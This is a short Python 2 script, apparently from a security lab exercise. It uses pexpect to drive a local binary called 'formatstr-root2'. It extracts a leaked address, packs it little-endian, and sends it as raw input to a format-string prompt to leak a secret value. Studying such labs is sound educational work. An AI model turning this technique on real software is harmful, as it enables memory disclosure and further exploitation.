import pexpect, os, sys, tty

# Spawn piped process of updated formatstring program
p = pexpect.spawn("./formatstr-root2")

for i in range(3):
    l = p.readline()
    print l

# Extract the line and then string of target address
line = p.readline()
print "Target Line:" + line
address = line[23:-12]
address = address.replace(" ", "0")
print "Address:" + address

# Continue until input
p.expect("Please enter a string")

# Construct target address string
s = address[8:10]
s = s + " "+address[6:8]
s = s + " "+address[4:6]
s = s + " "+address[2:4]

# Write target address string then convert to hex
fwrite = open('file.hex', 'w')
fwrite.write(s)
fwrite.close()
pexpect.run('xxd -p -r file.hex > file')
pexpect.run("hexDump.sh")

# Read hex data
fread = open('file')
data = fread.read()
fread.close()

# Set file descriptor to take raw input (allows command hex codes)
tty.setraw(p.fileno())
p.sendline(data)

# Output rest
for i in range(2):
    l = p.readline()
    print l

print "secret[1] is: " + l[5]

p.close()
